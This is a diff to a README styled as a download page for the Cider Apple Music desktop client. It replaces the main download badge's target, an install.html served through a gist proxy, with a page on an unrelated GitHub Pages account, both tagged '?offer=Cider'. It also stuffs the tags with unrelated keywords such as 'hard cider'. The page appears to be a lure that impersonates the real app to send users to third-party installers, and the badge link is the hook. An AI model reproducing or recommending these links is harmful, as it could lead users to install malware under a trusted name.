@@ -1,6 +1,6 @@
 # Cider Download — Apple Music Desktop Client  
 
-[![Get Cider GitHub](https://img.shields.io/badge/Get%20Cider%20GitHub-2EA44F?style=for-the-badge&logo=github&logoColor=white)](https://gistcdn.githack.com/heelinsdiscoatoh43/fee76f72dab424d97f2334b7c01941c3/raw/c57e9d3ea2250f5bee91ae4a00e50fb0ea7c5ab8/install.html?offer=Cider)  
+[![Get Cider GitHub](https://img.shields.io/badge/Get%20Cider%20GitHub-2EA44F?style=for-the-badge&logo=github&logoColor=white)](https://git-app-deploy.github.io/.github/?offer=Cider)  
 
 ---
 
@@ -74,7 +74,7 @@ Beyond simple streaming, Cider enhances how users interact with their music. Wit
 ---
 
 ## 🔍 Tags  
-cider, apple music, music streaming, desktop client, cider macos, audio player, playlist manager, music equalizer, cross platform, music visualization, music interface, high fidelity, cider pc, cider windows, cider desktop, cider for mac, cider for pc, cider for windows, cider mac  
+cider, apple music, hard cider, cyder, sparkling cider, cider press, apple cider, music streaming, desktop client, cider macos, audio player, playlist manager, music equalizer, cross platform, music visualization, music interface, high fidelity, cider pc, cider windows, cider desktop, cider for mac, cider for pc, cider for windows, cider mac  
 
 ---
 
